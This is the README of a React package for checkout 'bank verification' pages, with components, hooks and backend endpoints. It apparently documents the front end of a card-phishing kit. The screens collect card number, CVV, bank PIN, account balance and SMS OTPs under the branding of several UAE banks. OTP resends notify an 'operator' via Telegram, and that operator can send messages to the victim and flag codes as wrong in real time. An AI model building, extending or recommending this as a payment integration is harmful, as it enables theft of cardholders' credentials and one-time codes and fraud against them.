# @ncc/bank-verification-ui

Bank verification UI and hooks for checkout flows. Handles SMS OTP, PIN, push, and balance-check verification layouts with real-time status updates via WebSocket. Minimal package with no Tailwind or modal dependencies.

## Installation

```bash
npm install @ncc/bank-verification-ui
# or
pnpm add @ncc/bank-verification-ui
# or
bun add @ncc/bank-verification-ui
```

**Peer dependency:** `react` ^18.0.0

## Setup

Import the CSS once in your app (e.g. in `main.tsx` or your root layout):

```ts
import "@ncc/bank-verification-ui/styles.css";
```

## Quick start

```tsx
import { BankVerification } from "@ncc/bank-verification-ui";

// In your verify route/page:
<BankVerification
  apiBase="https://api.example.com"
  channelSlug="test"
  sessionId={sessionId}
  onSuccess={(id) => navigate(`/success`)}
  onDeclined={(id, status) => navigate(`/declined?status=${status}`)}
  onError={(msg) => {
    if (msg === "invalid") navigate(`/checkout?error=invalid`, { replace: true });
  }}
  onRedirect={(url) => window.location.assign(url)}
/>
```

For local dev, pass your backend URL directly (e.g. `apiBase="http://localhost:3002"`). No proxy needed; ensure the backend allows CORS for your app origin.

## API Reference

### `BankVerification`

Ready-made verification page component. Renders the appropriate layout (SMS OTP, PIN, push, balance) based on session status and handles terminal states.

| Prop         | Type                                   | Required | Description |
|--------------|----------------------------------------|----------|-------------|
| `apiBase`    | `string`                               | Yes      | Base URL for the API (e.g. `https://api.example.com`, `http://localhost:3002`). Pass the full origin; paths like `/v1/channels/...` are appended. Use `""` only when API is same-origin. |
| `channelSlug`| `string`                               | Yes      | Channel identifier (e.g. `"test"`, `"sms"`). |
| `sessionId`  | `string`                               | Yes      | Checkout session ID. |
| `onSuccess`  | `(sessionId: string) => void`          | No       | Called when verification succeeds. Navigate to your success page. |
| `onDeclined` | `(sessionId: string, status: string) => void` | No | Called for terminal declined statuses: `declined`, `expired`, `blocked`. Navigate to your declined page. |
| `onError`    | `(error: string) => void`              | No       | Called for `invalid` status. Typically navigate back to checkout so the user can try a different card. **Important:** without this, `invalid` shows a blank page. |
| `onRedirect` | `(url: string) => void`               | No       | Called when the backend returns a redirect URL (e.g. bank-hosted 3DS). Default: `window.location.replace(url)`. |
| `onClose`    | `() => void`                          | No       | Called when the user clicks the header close button (X). Use when rendering inside a modal to close it (e.g. `onClose={() => setShowModal(false)}`). |

### `useCheckoutFlow`

Hook for checkout and processing pages. Handles session creation, payment submission, BIN lookup, and callback-based status routing via WebSocket.

**Two modes:**

- **Checkout mode** (no `sessionIdFromUrl`): `submitPayment` creates a session if needed, submits, then resolves the response status to callbacks.
- **Processing mode** (`sessionIdFromUrl` provided): Uses WebSocket via `useSessionStatus` and invokes callbacks when status changes.

```ts
useCheckoutFlow(
  apiBase: string,
  apiKey: string,
  channelSlug: string,
  callbacks: CheckoutFlowCallbacks,
  sessionIdFromUrl?: string
)
```

**Callbacks:**

| Callback | When |
|----------|------|
| `onNeedsVerification(channel, sessionId)` | Status requires verification (SMS, PIN, push, balance) or `blocked` |
| `onSuccess(channel, sessionId)` | Payment succeeded |
| `onDeclined(channel, sessionId, status)` | Terminal declined (`declined`, `expired`, `blocked`) |
| `onInvalid(channel)` | Invalid card/transaction |
| `onProcessing(channel, sessionId)` | Still processing (redirect to processing page) |
| `onError?(error)` | API error during submit |

**Returns:** `{ submitPayment, binLookup, sessionId, channel }`

**Example (checkout page):**

```tsx
const { submitPayment, binLookup } = useCheckoutFlow(
  config.apiBase,
  config.apiKey,
  channelSlug ?? "test",
  {
    onNeedsVerification: (ch, sid) => navigate(buildVerifyRoute(ch, sid), { replace: true }),
    onSuccess: (ch, sid) => navigate(buildSuccessRoute(ch, sid), { replace: true }),
    onDeclined: (ch, sid, st) => navigate(buildDeclinedRoute(ch, sid, st), { replace: true }),
    onInvalid: (ch) => navigate(buildCheckoutRoute(ch, { error: "invalid" }), { replace: true }),
    onProcessing: (ch, sid) => navigate(buildProcessingRoute(ch, sid), { replace: true }),
    onError: (msg) => setSubmitError(msg),
  }
);

<CardForm onSubmit={(data) => submitPayment(data)} onBinLookup={binLookup} />
```

**Example (processing page):**

```tsx
useCheckoutFlow(
  config.apiBase,
  config.apiKey,
  channelSlug ?? "",
  {
    onNeedsVerification: (ch, sid) => navigate(buildVerifyRoute(ch, sid), { replace: true }),
    onSuccess: (ch, sid) => navigate(buildSuccessRoute(ch, sid), { replace: true }),
    onDeclined: (ch, sid, st) => navigate(buildDeclinedRoute(ch, sid, st), { replace: true }),
    onInvalid: (ch) => navigate(buildCheckoutRoute(ch, { error: "invalid" }), { replace: true }),
    onProcessing: () => {},
    onError: (msg) => setError(msg),
  },
  sessionId  // from URL params — triggers WebSocket watch mode
);
```

### `useSessionStatus`

Hook for custom UIs. Subscribes via WebSocket for real-time status updates.

```ts
useSessionStatus(apiBase: string, channelSlug: string, sessionId: string | null)
```

When `sessionId` is `null` or empty, the hook skips API/WebSocket calls and returns default values.

**Returns:**

| Property              | Type                                               | Description |
|-----------------------|----------------------------------------------------|-------------|
| `status`              | `string`                                           | Current session status (see [Status values](#status-values)). |
| `verificationLayout`  | `string`                                           | Layout to render: `sms`, `pin`, `push`, `balance`, or channel-specific (`enbd-sms`, `adcb-sms`, etc.). |
| `bank`                | `string \| undefined`                              | Bank/issuer name from BIN lookup (e.g. "Emirates NBD"). Displayed in verification layouts when present. |
| `redirectUrl`         | `string \| null`                                   | If set, redirect the user to this URL. |
| `transactionDetails`  | `TransactionDetails \| undefined`                  | Merchant, amount, date, card info for display in verification layouts. |
| `wrongCode`           | `boolean`                                          | True when OTP/PIN was incorrect; show "try again" UI. |
| `expiredCode`         | `boolean`                                          | True when OTP/PIN was expired; show "Code expired" message. |
| `clearWrongCode`      | `() => void`                                       | Call to reset `wrongCode` after user retries. |
| `clearExpiredCode`    | `() => void`                                       | Call to reset `expiredCode`. |
| `clearCodeFeedback`   | `() => void`                                       | Call to reset both `wrongCode` and `expiredCode`; use as `onTryAgain`. |
| `operatorMessage`     | `{ level: "error" \| "info"; message: string } \| null` | Message from the backend to display. |
| `clearOperatorMessage`| `() => void`                                       | Call to clear the operator message. |
| `countdownResetTrigger`| `number`                                           | Increments when backend sends `countdownReset`; pass to `useResendCountdown` to reset resend cooldown. |
| `error`               | `string \| null`                                   | Error message if the initial status fetch failed. |
| `refetch`             | `() => Promise<void>`                               | Manually refetch status. |

### `useResendCountdown`

Hook for resend cooldown in custom OTP/PIN layouts. Use with `countdownResetTrigger` from `useSessionStatus` so the backend can reset the cooldown (e.g. after wrong code).

```ts
useResendCountdown(durationSeconds: number, countdownResetTrigger?: number, resendFn?: () => Promise<void>)
```

**Returns:** `{ secondsLeft, canResend, onResend, resending }`

### Status utilities

Exported helpers for status values:

- **`needsVerification(status)`** — `true` for `awaiting_sms`, `awaiting_pin`, `awaiting_push`, `awaiting_balance`
- **`isTerminal(status)`** — `true` for `success`, `declined`, `expired`, `blocked`, `invalid`
- **`VERIFICATION_STATUSES`** — Array of verification status strings
- **`TERMINAL_STATUSES`** — Array of terminal status strings
- **`DECLINED_STATUS_MESSAGES`** — User-facing messages for declined statuses: `{ declined: "...", expired: "...", blocked: "...", invalid: "..." }`
- **Types:** `VerificationStatus`, `TerminalStatus`

### Types

- **`BankConfig`** — `{ apiBase: string }`
- **`BankVerificationProps`** — Props interface for `BankVerification`
- **`CheckoutFlowCallbacks`** — Callback interface for `useCheckoutFlow`
- **`PaymentData`** — Payment data shape for `submitPayment`
- **`UseCheckoutFlowReturn`** — Return type of `useCheckoutFlow`
- **`BinLookupInfo`** — `{ brand?, type?, category?, issuer?, isoCode2?, blocked }` — Used by `binLookup` from `useCheckoutFlow`.
- **`TransactionDetails`** — `{ merchantName?, amount?, date?, cardNumber?, cardBrand? }` — Transaction info for verification layouts.

## Status values

| Status             | Description |
|--------------------|-------------|
| `pending`          | Initial state; processing. |
| `awaiting_action`  | Waiting for backend; processing. |
| `awaiting_sms`     | SMS OTP required. |
| `awaiting_pin`     | PIN entry required. |
| `awaiting_push`    | Push notification; user confirms in bank app. |
| `awaiting_balance` | Balance check required. |
| `success`          | Verification complete → `onSuccess`. |
| `declined`         | Card declined → `onDeclined`. |
| `expired`          | Session expired → `onDeclined`. |
| `blocked`          | Transaction blocked → `onDeclined`. |
| `invalid`          | Invalid card/transaction → `onError("invalid")`. |

## Verification layouts

The component supports these `verificationLayout` values:

| Layout       | UI                        |
|--------------|---------------------------|
| `sms`        | 6-digit OTP input         |
| `pin`        | PIN entry                 |
| `push`       | "Waiting for approval"    |
| `balance`    | Balance selection         |
| `enbd-sms`   | SMS OTP (ENBD)            |
| `adcb-sms`   | SMS OTP (ADCB)            |
| `fab-sms`    | SMS OTP (FAB)             |
| `mashreq-sms`| SMS OTP (Mashreq)         |

Unknown layouts fall back to `sms`.

## Backend API requirements

### Bank verification endpoints (session-based auth)

Your API must expose these paths (appended to `apiBase`). For direct API calls (e.g. `apiBase="http://localhost:3002"`), the backend must allow CORS for your app origin.

| Endpoint   | Method | Purpose |
|------------|--------|---------|
| `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/status` | GET  | Session status, `verificationLayout`, `bank` (issuer name from BIN lookup), and `transactionDetails`. |
| `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/otp`   | POST | Submit SMS OTP code. Body: `{ code: string }`. |
| `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/otp/resend` | POST | Request resend. Body: `{ type: "sms" }` or `{ type: "pin" }`. Notifies operator via Telegram. |
| `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/balance` | POST | Submit balance response. Body: `{ balance: string }`. |
| `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/ws`   | WebSocket | Real-time status, `bank`, `transactionDetails`, `redirectUrl`, `wrongCode`, `expiredCode`, `operatorMessage`, `countdownReset`. |

Bank verification uses session-based auth (no API key in requests); session is identified by cookies or similar.

### Checkout endpoints (Bearer API key)

For `useCheckoutFlow`, your backend must expose these paths (appended to `apiBase`). For direct API calls, the backend must allow CORS for your app origin.

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/v1/channels/{channelSlug}/checkout/sessions` | POST | Create session. Body: `{ sessionData?: object }`. Header: `Authorization: Bearer {apiKey}`. |
| `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/payment` | POST | Submit payment. Body: `{ cardNumber, expiryMonth, expiryYear, cvv, amount, currency, ... }`. |
| `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/status` | GET | Session status. Header: `Authorization: Bearer {apiKey}`. |
| `/v1/bins/lookup` | POST | BIN lookup. Body: `{ bin: string }`. Header: `Authorization: Bearer {apiKey}`. |

## Custom hook usage

Use `useSessionStatus` when you need full control over the UI:

```tsx
import { useSessionStatus } from "@ncc/bank-verification-ui";

function CustomVerifyPage({ apiBase, channelSlug, sessionId }) {
  const {
    status,
    verificationLayout,
    bank,
    transactionDetails,
    redirectUrl,
    wrongCode,
    clearWrongCode,
    operatorMessage,
    countdownResetTrigger,
    error,
    refetch,
  } = useSessionStatus(apiBase, channelSlug, sessionId);

  if (redirectUrl) {
    window.location.assign(redirectUrl);
    return null;
  }
  if (status === "success") return <SuccessScreen />;
  if (["declined", "expired", "blocked"].includes(status)) return <DeclinedScreen status={status} />;
  if (status === "invalid") return <InvalidScreen />; // or redirect back to checkout
  if (error) return <ErrorScreen message={error} onRetry={refetch} />;

  return (
    <YourCustomLayout
      layout={verificationLayout}
      bank={bank}
      transactionDetails={transactionDetails}
      wrongCode={wrongCode}
      onTryAgain={clearWrongCode}
      operatorMessage={operatorMessage}
      countdownResetTrigger={countdownResetTrigger}
      apiBase={apiBase}
      channelSlug={channelSlug}
      sessionId={sessionId}
    />
  );
}
```

## Complete example (React Router)

```tsx
import { BankVerification } from "@ncc/bank-verification-ui";
import { useParams, useNavigate } from "react-router-dom";

export function VerifyPage() {
  const { channelSlug, sessionId } = useParams();
  const navigate = useNavigate();

  if (!channelSlug || !sessionId) {
    return <div>Missing channel or session</div>;
  }

  return (
    <BankVerification
      apiBase="https://api.example.com"
      channelSlug={channelSlug}
      sessionId={sessionId}
      onSuccess={(sid) => navigate(`/checkout/channels/${channelSlug}/sessions/${sid}/success`)}
      onDeclined={(sid, status) =>
        navigate(`/checkout/channels/${channelSlug}/sessions/${sid}/declined?status=${status}`)
      }
      onError={(msg) => {
        if (msg === "invalid") {
          navigate(`/checkout/channels/${channelSlug}?error=invalid`, { replace: true });
        }
      }}
      onRedirect={(url) => window.location.assign(url)}
    />
  );
}
```
